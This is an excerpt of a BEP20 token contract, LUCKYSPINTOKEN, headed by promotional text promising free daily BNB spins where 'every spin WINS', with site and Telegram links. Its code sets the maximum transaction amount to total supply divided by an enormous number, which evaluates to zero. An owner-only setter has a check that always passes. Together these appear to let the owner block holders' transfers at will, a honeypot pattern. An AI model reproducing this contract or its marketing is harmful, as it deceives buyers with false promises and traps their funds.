...
Are you lucky?
The first coin that gives you a FREE chance to win additional BNB every day. And the best part - every spin WINS!

FREE SPIN EVERY DAY
Hold the $LUCKYS tokens for 24 hours and get a FREE chance every day to win an additional BNB. Each spin is wining one, the amount is different.


http://luckyspincoin.co/ 

https://t.me/LuckySpinToken
*/
...
contract LUCKYSPINTOKEN is IBEP20,  Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "LUCKYSPINTOKEN";
    string constant _symbol = "LUCKYSPINTOKEN";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 10000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply / 200000000000000000000000000000; 
    ...
    function setTxLimit(uint256 amount) external authorized {
        require(amount >= _totalSupply / 200000000000000000000000000000000000000000000000000000);
        _maxTxAmount = amount;
    }
